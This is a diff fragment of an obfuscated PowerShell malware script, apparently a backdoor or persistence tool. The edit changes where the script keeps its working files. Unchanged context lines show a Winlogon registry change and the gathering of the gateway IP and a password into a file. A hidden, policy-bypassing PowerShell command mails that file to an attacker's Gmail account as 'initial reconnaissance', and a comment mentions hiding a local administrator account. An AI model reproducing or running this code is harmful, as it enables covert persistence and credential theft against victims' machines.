@@ -33,7 +33,7 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlo
 
 # Variables
 $EubGKxeoVHdWnNIr = mfRCoqywZDeQlL(5)
-$rkeuRmdqpyEPQG = "$env:TEMP\$EubGKxeoVHdWnNIr"
+# $rkeuRmdqpyEPQG = "$env:TEMP\$EubGKxeoVHdWnNIr"
 # save current directory
 $fXmtFxsAMdGw = Get-Location|%{$_.Path}
 
@@ -45,7 +45,7 @@ $LcghRQwiJbdINVyFY = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGate
 # generate config file
 Add-Content -Path $rtsRfiZBxpGP -Value $LcghRQwiJbdINVyFY   #ip
 Add-Content -Path $rtsRfiZBxpGP -Value $OIRXhsDHFU          #pass
-Add-Content -Path $rtsRfiZBxpGP -Value $rkeuRmdqpyEPQG      #working dir
+Add-Content -Path $rtsRfiZBxpGP -Value $env:temp            #temp dir
 Add-Content -Path $rtsRfiZBxpGP -Value $fXmtFxsAMdGw        #startup dir
 # Send Initial reconnaissance
 powershell powershell.exe -noP -ep bypass -w hidden "{Send-MailMessage -from $QLxOhYDbSkv -to $QLxOhYDbSkv -subject $rtsRfiZBxpGP -attachments $rtsRfiZBxpGP -smtpserver 'smtp.gmail.com' -port '587' -usessl -credential (new-object -typename system.management.automation.pscredential -argumentlist $QLxOhYDbSkv ,(convertto-securestring -string '$MQKWAnzsGSxJ' -asplaintext -force))}"
@@ -57,8 +57,8 @@ Remove-Item .\$rtsRfiZBxpGP -Force
 
 
 # goto temp and make working directory
-mkdir $rkeuRmdqpyEPQG
-cd $rkeuRmdqpyEPQG
+# mkdir $rkeuRmdqpyEPQG
+# cd $rkeuRmdqpyEPQG
 
 # Download registry to hide local admin
 # $reg_file = mfRCoqywZDeQlL(Get-Random -Minimum 6 -Maximum 13)
